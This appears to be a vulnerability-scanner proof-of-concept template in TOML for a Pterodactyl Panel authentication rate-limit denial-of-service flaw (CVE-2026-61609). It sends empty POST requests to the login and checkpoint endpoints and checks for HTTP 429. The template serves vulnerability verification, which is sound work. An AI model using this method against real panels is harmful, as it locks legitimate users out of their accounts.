[info]
author = "AVE"
description = "通过向 /auth/login/checkpoint 发送约 10 次/分钟的 POST 请求，耗尽全局共享速率限制计数器，导致所有用户登录和双因素认证返回 HTTP 429，验证面板级认证拒绝服务漏洞"
id = "POC-AVE-2026-0889"
name = "Pterodactyl Panel 认证全局速率限制拒绝服务漏洞 PoC"
severity = "high"
tags = [
    "cve-2026-61609",
    "pterodactyl",
    "dos",
    "rate-limit",
]
vuln_id = [
    "CVE-2026-61609",
    "AVE-2026-0889",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/auth/login/checkpoint"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [429]
type = "status"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/auth/login"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [429]
type = "status"
